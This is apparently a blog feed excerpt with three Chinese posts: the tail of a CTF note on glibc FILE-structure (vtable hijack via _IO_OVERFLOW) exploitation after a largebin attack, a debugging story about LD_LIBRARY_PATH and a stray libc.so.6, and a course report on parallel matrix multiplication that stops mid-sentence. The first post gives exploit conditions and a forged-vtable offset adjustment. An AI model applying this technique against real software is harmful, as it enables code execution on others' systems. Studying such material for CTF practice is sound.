                    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="cp">#endif
</span>       <span class="p">)</span>
      <span class="o">&amp;&amp;</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
           <span class="p">{</span>
               <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="其中_io_overflow会使用虚表中0x18处的函数-这就给我们可乘之机">   其中<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code>会使用虚表中<code class="language-plaintext highlighter-rouge">0x18</code>处的函数, 这就给我们可乘之机<br/></h5> <h5 id="为了避免短路-想要执行到_io_overflow-有两种选择条件">   为了避免短路, 想要执行到<code class="language-plaintext highlighter-rouge">_IO_OVERFLOW</code>, 有两种选择条件:</h5> <h5 id="第一种">   第一种:</h5> <h5 id="1-fp-_mode--0">    1. <code class="language-plaintext highlighter-rouge">fp-&gt;_mode &lt;= 0</code></h5> <h5 id="2-fp-_io_write_ptr--fp-_io_write_base">    2. <code class="language-plaintext highlighter-rouge">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></h5> <h5 id="第二种">   第二种:</h5> <h5 id="1_io_vtable_offsetfp--0">    1.<code class="language-plaintext highlighter-rouge">_IO_vtable_offset(fp) == 0</code></h5> <h5 id="2fp-_mode--0">    2.<code class="language-plaintext highlighter-rouge">fp-&gt;_mode &gt; 0</code></h5> <h5 id="3-fp-_wide_data-_io_write_ptr--fp-_wide_data-_io_write_base">    3. <code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></h5> <h5 id="但是在使用largebin-attack的情况下-第一种情况很难满足-因为_io_write_ptr和_io_write_base在chunk中的位置是fd_nextsize和bk_nextsize的位置">   但是在使用largebin attack的情况下, 第一种情况很难满足, 因为<code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>和<code class="language-plaintext highlighter-rouge">_IO_write_base</code>在chunk中的位置是fd_nextsize和bk_nextsize的位置.<br/></h5> <h5 id="所以一般是第二种实现起来更方便">   所以一般是第二种实现起来更方便<br/></h5> <h5 id="至于之前使用的模板-只需要把伪造的vtable--0x10-改成-vtabel--0x30即可">   至于之前使用的模板, 只需要把伪造的<code class="language-plaintext highlighter-rouge">vtable + 0x10</code> 改成 <code class="language-plaintext highlighter-rouge">vtabel + 0x30</code>即可<br/></h5>]]></content><author><name>久菜合子</name></author><category term="pwn"/><category term="CTF"/><summary type="html"><![CDATA[ 好不容易学点东西赶紧记下来, 不然过几天又忘记了]]></summary></entry><entry><title type="html">[水贴]记一次离谱报错</title><link href="https://leakbox258.github.io/blog/2024/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%B0%B1%E7%9A%84%E6%8A%A5%E9%94%99/" rel="alternate" type="text/html" title="[水贴]记一次离谱报错"/><published>2024-12-01T00:00:00+00:00</published><updated>2024-12-01T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%B0%B1%E7%9A%84%E6%8A%A5%E9%94%99</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%B0%B1%E7%9A%84%E6%8A%A5%E9%94%99/"><![CDATA[<h5 id="前情提要-由于国赛在即-而本人已经做了一个多月的dev没有碰过pwn-所以打算复健一下-结果第一个上午用着wsl就碰上了一个离谱bug">前情提要: 由于国赛在即, 而本人已经做了一个多月的dev没有碰过pwn, 所以打算复健一下, 结果第一个上午用着wsl就碰上了一个离谱bug</h5> <h3 id="bug">Bug</h3> <h5 id="-一个归档文件中-包含了一个名为libcso6的libc同名文件-然后tar--xf一下-奇迹出现了-shell内除了buildin的工具全部失效了-显示以下报错">    一个归档文件中, 包含了一个名为<code class="language-plaintext highlighter-rouge">libc.so.6</code>的libc同名文件, 然后<code class="language-plaintext highlighter-rouge">tar -xf</code>一下, 奇迹出现了, shell内除了buildin的工具全部失效了, 显示以下报错</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.28<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by <span class="nb">ls</span><span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.34<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.30<span class="s1">' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
ls: libc.so.6: version `GLIBC_2.34'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
</code></pre></div></div> <h5 id="然而-当使用cd离开这个目录之后-一切又恢复正常-而且vscode中提供的文件操作也可以使用">   然而, 当使用cd离开这个目录之后, 一切又恢复正常, 而且vscode中提供的文件操作也可以使用</h5> <h5 id="笔者又从zsh切换到bash-然后是sh-发现问题不变">   笔者又从zsh切换到bash, 然后是sh, 发现问题不变,</h5> <h3 id="找原因和debug">找原因和Debug</h3> <h5 id="综上所述-问题的根源应该是非shell-buildin的工具寻址里libcso6时出现了问题-在工作目录中没有名为libcso6的文件时-会正常寻址-有的时候则会尝试链接当前的工作目录下的文件">   综上所述, 问题的根源应该是非shell buildin的工具寻址里libc.so.6时出现了问题, 在工作目录中没有名为<code class="language-plaintext highlighter-rouge">libc.so.6</code>的文件时, 会正常寻址, 有的时候则会尝试链接当前的工作目录下的文件</h5> <h5 id="证据如下">   证据如下</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># libc.so.6 版本过低</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.28<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by <span class="nb">ls</span><span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.34<span class="s1">' not found (required by ls)
ls: libc.so.6: version `GLIBC_2.33'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
<span class="nb">ls</span>: libc.so.6: version <span class="sb">`</span>GLIBC_2.30<span class="s1">' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
ls: libc.so.6: version `GLIBC_2.34'</span> not found <span class="o">(</span>required by /lib/x86_64-linux-gnu/libselinux.so.1<span class="o">)</span>
<span class="c"># libc.so.6 空的, 或者是一个文本文件</span>
<span class="nb">ls</span>: error <span class="k">while </span>loading shared libraries: libc.so.6: file too short
<span class="c"># libc.so.6 格式不对</span>
<span class="nb">ls</span>: error <span class="k">while </span>loading shared libraries: libc.so.6: cannot dynamically load position-independent executable
</code></pre></div></div> <h5 id="显然问题和库文件的搜索有关-笔者想起来前段时间安装cuda时更改过bashrc中的搜索路径的环境变量-当时在bashrc的结尾加上了-作为nvcc的库文件搜索路径">   显然问题和库文件的搜索有关, 笔者想起来前段时间安装cuda时更改过<code class="language-plaintext highlighter-rouge">.bashrc</code>中的搜索路径的环境变量<br/>    当时在<code class="language-plaintext highlighter-rouge">.bashrc</code>的结尾加上了, 作为<code class="language-plaintext highlighter-rouge">nvcc</code>的库文件搜索路径</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#config cuda</span>
<span class="nb">export </span><span class="nv">CUDA_HOME</span><span class="o">=</span>/usr/local/cuda-12.3
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:<span class="nv">$CUDA_HOME</span>/bin
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/lib64
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/extras/CUPTI/lib64
</code></pre></div></div> <h5 id="由于bashrc中默认没有ld_library_path的配置至少我的没有-所以上述的工具在cuda的库文件中肯定找不到libcso6-所以理论上将libcso6重新加到搜索路径中即可">   由于<code class="language-plaintext highlighter-rouge">.bashrc</code>中默认没有<code class="language-plaintext highlighter-rouge">LD_LIBRARY_PATH</code>的配置(至少我的没有), 所以上述的工具在CUDA的库文件中肯定找不到libc.so.6, 所以理论上将libc.so.6重新加到搜索路径中即可</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/lib/x86_64-linux-gnu

<span class="c">#config cuda</span>
<span class="nb">export </span><span class="nv">CUDA_HOME</span><span class="o">=</span>/usr/local/cuda-12.3
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:<span class="nv">$CUDA_HOME</span>/bin
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/lib64
<span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="nv">$LD_LIBRARY_PATH</span>:<span class="nv">$CUDA_HOME</span>/extras/CUPTI/lib64
</code></pre></div></div> <h5 id="大概就是这样-完成之后再source-bashrc-即可">   大概就是这样, 完成之后再<code class="language-plaintext highlighter-rouge">source .bashrc</code>, 即可</h5> <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /home/pwn/testtable/works ▓▒░                                                                                         ░▒▓ ✔  root@PainTech  10:48:21 ─╮
╰─ <span class="nb">ls</span>                                                                                                                                                       ─╯
libc  libc.so.6  pwn
</code></pre></div></div> <h3 id="在此之后">在此之后</h3> <h5 id="即使成功解决了bug-有几个问题没有存在疑惑">   即使成功解决了bug, 有几个问题没有存在疑惑</h5> <h5 id="1-bashrc在ld_library_path没有被填写的情况下-为何正常链接">   1. <code class="language-plaintext highlighter-rouge">.bashrc</code>在LD_LIBRARY_PATH没有被填写的情况下, 为何正常链接</h5> <h5 id="2-为何工作目录下没有libcso6可以正常链接">   2. 为何工作目录下没有libc.so.6可以正常链接</h5> <h5 id="这里主要和ld_library_path的工作有关动态链接的文件会按照ld_library_path所列出的顺序-依次查找-路径之间使用--分割">   这里主要和LD_LIBRARY_PATH的工作有关,<br/>   动态链接的文件会按照LD_LIBRARY_PATH所列出的顺序, 依次查找, 路径之间使用 ‘:’ 分割</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ ~ ▓▒░                                                                                                                         ░▒▓ ✔  root@PainTech  11:09:01 ─╮
╰─ <span class="nb">echo</span> <span class="nv">$LD_LIBRARY_PATH</span>                                                                                                                                            ─╯
/lib/x86_64-linux-gnu:/usr/local/cuda-12.3/lib64:/usr/local/cuda-12.3/extras/CUPTI/lib64
</code></pre></div></div> <h5 id="所以当添加好libc的目录之后-链接就不再会出问题">   所以当添加好libc的目录之后, 链接就不再会出问题<br/></h5> <h5 id="但是仅仅这样无法解释-之前没有libx86_64-linux-gnu时如何正常工作-以及为什么有上面的bug出现">   但是仅仅这样无法解释, 之前没有<code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu</code>时如何正常工作, 以及为什么有上面的bug出现<br/></h5> <h5 id="linux一个可执行文件寻找自己的链接的动态库有5种方式-绝对路径-相对路径--rpath-ld_library_path-etcldsoconf这样写应该会比较具体-但是网上的资料至少是中文资料大多不全-或者是没有明确的执行顺序的排列">   linux一个可执行文件寻找自己的链接的动态库有5种方式, 绝对路径 相对路径 -rpath LD_LIBRARY_PATH /etc/ld.so.conf(这样写应该会比较具体), 但是网上的资料(至少是中文资料)大多不全, 或者是没有明确的执行顺序的排列<br/></h5> <h5 id="举个例子-下面是一个elf的header-interpreter为绝对路径-ld一般都是绝对路径-因为需要ld来执行库的查找">   举个例子, 下面是一个ELF的Header, Interpreter为绝对路径, ld一般都是绝对路径, 因为需要ld来执行库的查找<br/></h5> <h5 id="needed-library比较有说头-像这里的libcso6-首先一般情况下它应该被设计为某个文件夹中的一个文件名-但是实际上-也可以被看作一个相对路径作为对比-如果是-libcso6-就是一个单纯的相对路径">   Needed Library比较有说头, 像这里的’libc.so.6’, 首先一般情况下它应该被设计为某个文件夹中的一个文件名, 但是实际上, 也可以被看作一个相对路径,<br/>   作为对比, 如果是 ‘./libc.so.6’ 就是一个单纯的相对路径<br/></h5> <h5 id="猜测是ls等非shell-buildin-的工具-在链接时把-libcso6-当成了相对路径-这里的相对是相对于使用命令的工作目录">   猜测是ls等非shell buildin 的工具, 在链接时把 ‘libc.so.6’ 当成了相对路径, 这里的相对是相对于使用命令的工作目录</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="-rpath-检查-rpath指定的路径--rpath是编译器编译时的一个可选项-下面是未使用和使用了-rpath参数的对比">   -rpath, 检查-rpath指定的路径, -rpath是编译器编译时的一个可选项, 下面是未使用和使用了-rpath参数的对比</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>

LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libstdc++.so.6'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
LOAD:0000000000000000 <span class="p">;</span> Library runpath <span class="s1">'/lib/x86_64-linux-gnu'</span> <span class="c"># &lt;------</span>
</code></pre></div></div> <h5 id="意思就是-needed-library-需要在-library-runpath-中找">   意思就是 <code class="language-plaintext highlighter-rouge">Needed Library</code> 需要在 <code class="language-plaintext highlighter-rouge">Library runpath</code> 中找</h5> <h5 id="ls执行文件的header信息-可以看到是没有指定-rpath的-没有-rpath相当于第一步直接放弃掉了">   ls执行文件的header信息, 可以看到是没有指定-rpath的, 没有-rpath相当于第一步直接放弃掉了</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000000000 <span class="p">;</span> Format      : ELF64 <span class="k">for </span>x86-64 <span class="o">(</span>Shared object<span class="o">)</span>
LOAD:0000000000000000 <span class="p">;</span> Interpreter <span class="s1">'/lib64/ld-linux-x86-64.so.2'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libselinux.so.1'</span>
LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'libc.so.6'</span>
</code></pre></div></div> <h5 id="-检查ld_library_path-流程不再赘述了-注意的是-ld_library_path是由bash等交互提供的-默认情况下应该是空的-但是实际上包含了usrlib以及lib文件夹">    检查LD_LIBRARY_PATH, 流程不再赘述了. 注意的是, LD_LIBRARY_PATH是由Bash等交互提供的, 默认情况下应该是空的, 但是实际上包含了<code class="language-plaintext highlighter-rouge">/usr/lib</code>以及<code class="language-plaintext highlighter-rouge">/lib</code>文件夹<br/></h5> <h5 id="-搜索etcldsoconf">    搜索<code class="language-plaintext highlighter-rouge">/etc/ld.so.conf</code>,</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ ~ ▓▒░                                                                                                                         ░▒▓ ✔  root@PainTech  13:24:04 ─╮
╰─ <span class="nb">cat</span> /etc/ld.so.conf                                                                                                                                              ─╯
include /etc/ld.so.conf.d/<span class="k">*</span>.conf
</code></pre></div></div> <h5 id="ldsoconf应该是没有动过的">   ld.so.conf应该是没有动过的</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /etc/ld.so.conf.d ▓▒░                                                                                                         ░▒▓ ✔  root@PainTech  13:25:10 ─╮
╰─ <span class="nb">ls</span>                                                                                                                                                               ─╯
000_cuda.conf     fakeroot-x86_64-linux-gnu.conf  i386-linux-gnu.conf  libc.conf              zz_i386-biarch-compat.conf
988_cuda-12.conf  gds-12-3.conf  
</code></pre></div></div> <h5 id="这里主要关注x86和libc的conf文件">   这里主要关注x86和libc的conf文件</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /etc/ld.so.conf.d ▓▒░                                                                                                         ░▒▓ ✔  root@PainTech  13:25:52 ─╮
╰─ <span class="nb">cat </span>x86_64-linux-gnu.conf                                                                                                                                        ─╯
<span class="c"># Multiarch support</span>
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ /etc/ld.so.conf.d ▓▒░                                                                                                         ░▒▓ ✔  root@PainTech  13:25:56 ─╮
╰─ <span class="nb">cat </span>libc.conf                                                                                                                                                    ─╯
<span class="c"># libc default configuration</span>
/usr/local/lib
</code></pre></div></div> <h3 id="如何导致bug的发生">如何导致bug的发生</h3> <h5 id="希腊奶只知道是由于可执行文件的中needed-library-中的-libcso6字段在链接过程中产生了歧义-一方面可以指的是环境变量路径中的libcso6-一方面也可以指工作目录下的libc即libcso6-由于种种原因-导致越过了ld_library和ldconfd的配置-直接在当前文件夹中尝试链接但是更具体的-ld_library和ldconfd的配置为什么被越过-以及正常情况下-它们的查找顺序是如何的仍然不太清晰">   希腊奶.<br/>   只知道是由于可执行文件的中<code class="language-plaintext highlighter-rouge">Needed Library</code> 中的 <code class="language-plaintext highlighter-rouge">libc.so.6</code>字段在链接过程中产生了歧义, 一方面可以指的是环境变量路径中的<code class="language-plaintext highlighter-rouge">libc.so.6</code>, 一方面也可以指工作目录下的libc(即<code class="language-plaintext highlighter-rouge">./libc.so.6</code>), 由于种种原因, 导致越过了<code class="language-plaintext highlighter-rouge">LD_LIBRARY</code>和ld.conf.d的配置, 直接在当前文件夹中尝试链接<br/>   但是更具体的, <code class="language-plaintext highlighter-rouge">LD_LIBRARY</code>和ld.conf.d的配置为什么被越过, 以及正常情况下, 它们的查找顺序是如何的仍然不太清晰</h5>]]></content><author><name>久菜合子</name></author><category term="debug"/><category term="水"/><summary type="html"><![CDATA[前情提要: 由于国赛在即, 而本人已经做了一个多月的dev没有碰过pwn, 所以打算复健一下, 结果第一个上午用着wsl就碰上了一个离谱bug]]></summary></entry><entry><title type="html">矩阵并行计算的探索—大作业</title><link href="https://leakbox258.github.io/blog/2024/%E7%9F%A9%E9%98%B5%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E7%9A%84%E6%8E%A2%E7%B4%A2/" rel="alternate" type="text/html" title="矩阵并行计算的探索—大作业"/><published>2024-11-15T00:00:00+00:00</published><updated>2024-11-15T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E7%9F%A9%E9%98%B5%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E7%9A%84%E6%8E%A2%E7%B4%A2</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E7%9F%A9%E9%98%B5%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E7%9A%84%E6%8E%A2%E7%B4%A2/"><![CDATA[<p>ps: 课题来自于泥卓的课后作业 ps: 建议把页面markdown自己放到vscode或者typora上, 因为本站的markdown似乎没有办法显示Latex语法</p> <h3 id="实验器材与工具">实验器材与工具</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>处理器：13th Gen Intel(R) Core(TM) i7-13700H   2.40 GHz
机带RAM: 16.0GB(15.7GB可用)
WSL 版本： 2.3.24.0
内核版本： 5.15.153.1-2
WSLg 版本： 1.0.65
MSRDC 版本： 1.2.5620
Direct3D 版本： 1.611.1-81528511
DXCore 版本： 10.0.26100.1-240331-1435.ge-release
Windows 版本： 10.0.22631.4317
g++ 版本：11.4.0
nvidia-cuda-toolkit: 12.3
</code></pre></div></div> <h3 id="矩阵乘法优化算法">矩阵乘法优化算法</h3> <h5 id="存在矩阵mmn和矩阵nnt做矩阵乘法按照矩阵乘法的定义一共需要做mnt次乘法计算以及mnt次加法计算不难理解如果可以减少运算的次数那么就会产生直观的优化效果">   存在矩阵M(m*n)和矩阵N(n*t)做矩阵乘法，按照矩阵乘法的定义，一共需要做m*n*t次乘法计算，以及m*n*t次加法计算，不难理解如果可以减少运算的次数，那么就会产生直观的优化效果</h5> <h5 id="strassen算法">Strassen算法<br/></h5> <h5 id="由上述分析一般的矩阵运算需要on3的复杂度但strassen算法通过分治的思想将大矩阵化成小矩阵-可以将这个值降至约on281">   由上述分析，一般的矩阵运算需要O(n\^3)的复杂度，但Strassen算法通过分治的思想，将大矩阵化成小矩阵, 可以将这个值降至约O(n\^2.81)<br/></h5> <h5 id="如图将两个44矩阵分割为四个分块矩阵">   如图，将两个4*4矩阵分割为四个分块矩阵，</h5> <p>$ A = \begin{bmatrix} \begin{pmatrix}a_{11}&amp;a_{12}\a_{21}&amp;a_{22}\end{pmatrix} &amp; \begin{pmatrix}a_{31}&amp;a_{32}\a_{41}&amp;a_{42}\end{pmatrix}<br/> \begin{pmatrix}a_{51}&amp;a_{52}\a_{61}&amp;a_{62}\end{pmatrix} &amp; \begin{pmatrix}a_{71}&amp;a_{72}\a_{81}&amp;a_{82}\end{pmatrix} \end{bmatrix} = \begin{bmatrix}A_1 &amp; A_2 \ A_3 &amp; A_4\end{bmatrix} <br/> B = \begin{bmatrix} \begin{pmatrix}b_{11}&amp;b_{12}\b_{21}&amp;b_{22}\end{pmatrix} &amp; \begin{pmatrix}b_{31}&amp;b_{32}\b_{41}&amp;b_{42}\end{pmatrix}<br/> \begin{pmatrix}b_{51}&amp;b_{52}\b_{61}&amp;b_{62}\end{pmatrix} &amp; \begin{pmatrix}b_{71}&amp;b_{72}\b_{81}&amp;b_{82}\end{pmatrix} \end{bmatrix} = \begin{bmatrix}B_1 &amp; B_2 \ B_3 &amp; B_4\end{bmatrix} $</p> <h5 id="此时c_11和矩阵c的计算方式如下">   此时，$C_{11}$和矩阵$C$的计算方式如下</h5> <p>$ C_{11} = \left(\begin{pmatrix}a_{11}&amp;a_{12}\a_{21}&amp;a_{22}\end{pmatrix}\begin{pmatrix}b_{11}&amp;b_{12}\b_{21}&amp;b_{22}\end{pmatrix}\right)+\left(\begin{pmatrix}a_{31}&amp;a_{32}\a_{41}&amp;a_{42}\end{pmatrix}\begin{pmatrix}b_{51}&amp;b_{52}\b_{61}&amp;b_{62}\end{pmatrix}\right) $ $ C = \begin{bmatrix} C_{11} &amp; C_{12}<br/> C_{21} &amp; C_{22} \end{bmatrix} $</p> <h5 id="用这种方式计算时时间代价来自两部分多次子矩阵乘法以及运算结果合并与组合">   用这种方式计算时，时间代价来自两部分，多次子矩阵乘法，以及运算结果合并与组合</h5> <p>$T(n) = k*T(n/2) + O(n^2), k代表矩阵乘法次数$</p> <h5 id="上式中的后项表示加法和合并的时间复杂度由于矩阵乘法本身为on3而前项的乘法是主要的时间开销所以化简的一种方式是尽可能减少乘法次数">   上式中的后项表示加法和合并的时间复杂度，由于矩阵乘法本身为$O(n^3)$，而前项的乘法是主要的时间开销。所以化简的一种方式是尽可能减少乘法次数</h5> <h5 id="以上面的a-b为例">   以上面的$A, B$为例</h5> <h5 id="首先先通过加减获得10个-22-矩阵如下">   首先先通过加减获得10个 2*2 矩阵如下</h5> <p>$ S_1 = B_{12} - B_{22}<br/> S_2 = A_{11} + A_{12}<br/> S_3 = A_{21} + A_{22}<br/> S_4 = B_{21} - B_{11}<br/> S_5 = A_{11} + A_{22}<br/> S_6 = B_{11} + B_{22}<br/> S_7 = A_{12} - A_{22}<br/> S_8 = B_{21} + B_{22}<br/> S_9 = A_{11} - A_{21}<br/> S_{10} = B_{11} + B_{12} $</p> <h5 id="然后再进一步通过乘法运算得到">   然后再进一步通过乘法运算得到</h5> <p>$ P_{1} =A_{11}\cdot S_{1}=A_{11}\cdot B_{12}-A_{11}\cdot B_{22}<br/> P_{2} =S_{2}\cdot B_{22}=A_{11}\cdot B_{22}+A_{12}\cdot B_{22}<br/> P_{3} =S_{3}\cdot B_{11}=A_{21}\cdot B_{11}+A_{22}\cdot B_{11}<br/> P_{4} =A_{22}\cdot S_{4}=A_{22}\cdot B_{21}-A_{22}\cdot B_{11}<br/> P_{5} =S_{5}\cdot S_{6}=A_{11}\cdot B_{11}+A_{11}\cdot B_{22}+A_{22}\cdot B_{11}+A_{22}\cdot B_{22}<br/> P_{6} =S_{7}\cdot S_{8}=A_{12}\cdot B_{21}+A_{12}\cdot B_{22}-A_{22}\cdot B_{21}-A_{22}\cdot B_{22}<br/> P_{7} =S_{9}\cdot S_{10}=A_{11}\cdot B_{11}+A_{11}\cdot B_{12}-A_{21}\cdot B_{11}-A_{21}\cdot B_{12} $</p> <h5 id="根据组合可以发现c实际上可以由上述计算的结果加减得到">   根据组合，可以发现$C$实际上可以由上述计算的结果加减得到</h5> <p>$ C_{11} = P_5 + P_4 - P_2 + P_6 <br/> C_{12} = P_1 + P_2 <br/> C_{21} = P_3 + P_4 <br/> C_{22} = P_5 + P_1 - P_3 - P_7 $</p> <h5 id="上述方法总共有7次-22-的矩阵乘法比直接计算少一次这是因为最后一次乘法的结果实际上可以由之前7次加减组合得到对于较大的矩阵乘法使用分治的方法递归的化为更小的矩阵相乘可以在递归的过程中多次减少所需乘法的数量对于本例时间复杂度为onlog_27">   上述方法总共有7次 2*2 的矩阵乘法，比直接计算少一次,这是因为最后一次乘法的结果实际上可以由之前7次加减组合得到。对于较大的矩阵乘法，使用分治的方法递归的化为更小的矩阵相乘，可以在递归的过程中多次减少所需乘法的数量<br/>   对于本例，时间复杂度为$O(n^{log_27})$</h5> <h5 id="更具体方式参考httpszhuanlanzhihucomp78657463-">   更具体方式参考https://zhuanlan.zhihu.com/p/78657463 <br/></h5> <h5 id="进一步的使用coppersmith-winograd可以将复杂度降至on2376">   进一步的，使用Coppersmith-Winograd可以将复杂度降至$O(n^{2.376})$<br/></h5> <h3 id="进程级别并行">进程级别并行</h3> <h4 id="cannon卡农算法">Cannon卡农算法</h4> <h5 id="假如可以将不同的c_ij的计算划给不同的进程分别计算最后组合拼接以获得的最终的矩阵c在这个过程中单独的一个进程将会需要a_i1-a_i2-a_i3b_1j-b_2j-b_3j等多个子矩阵来计算c_ij但是由于每个进程需要获取的子矩阵中存在重叠也就是一个子矩阵会被复制进入多个进程不利于节省空间开支在使用卡农算法时使每个进程只保存当前进程的计算结果以及两个子矩阵在各个进程完成了一轮计算后通过进程间的通信进程之间交换子矩阵以达到避免重复保存的效果">   假如可以将不同的$C_{ij}$的计算划给不同的进程分别计算，最后组合拼接以获得的最终的矩阵$C$.<br/>   在这个过程中，单独的一个进程将会需要$A_{i1}, A_{i2}, A_{i3}…B_{1j}, B_{2j}, B_{3j}…$等多个子矩阵来计算$C_{ij}$，但是由于每个进程需要获取的子矩阵中存在重叠，也就是一个子矩阵会被复制进入多个进程，不利于节省空间开支。<br/>   在使用卡农算法时，使每个进程只保存当前进程的计算结果、以及两个子矩阵，在各个进程完成了一轮计算后，通过进程间的通信，进程之间交换子矩阵，以达到避免重复保存的效果。</h5> <h5 id="例如存在方阵annbnn相乘得到矩阵c第一步将矩阵各分为sqrtn--sqrtn向下取整个子矩阵并将运算任务分配至n个线程-对应计算c_ij的进程中需要保存的子矩阵是a_ij-b_ij第二步进行子矩阵的对齐操作以计算c_ij的线程为例通过进程间通信使得a_ij在整个a中循环左移i位得到a_ij-i-1sqrtnsqrtn同理b_ij向上循环右移j位">   例如存在方阵A(n*n)，B(n*n)相乘得到矩阵C.<br/>   第一步，将矩阵各分为$\sqrt{n} * \sqrt{n}$（向下取整）个子矩阵，并将运算任务分配至$n$个线程, 对应计算$C_{ij}$的进程中需要保存的子矩阵是$A_{ij}, B_{ij}$<br/>   第二步，进行子矩阵的对齐操作。以计算$C_{ij}$的线程为例，通过进程间通信，使得$A_{ij}$在整个$A$中循环左移i位，得到$A_{i((j-i-1+\sqrt{n})\%\sqrt{n})}$，同理$B_{ij}$向上循环右移j位.</h5> <p><img src="https://www.helloimg.com/i/2024/11/10/67305d00b2eee.png" alt="697687-20190318173518810-1350254261.png"/></p> <h5 id="第三步各个进程执行一次矩阵乘法累加到c_ij然后将a_ij和b_ij分别向左向上移动一步-重复第三步直到一共计算sqrtn次乘法">   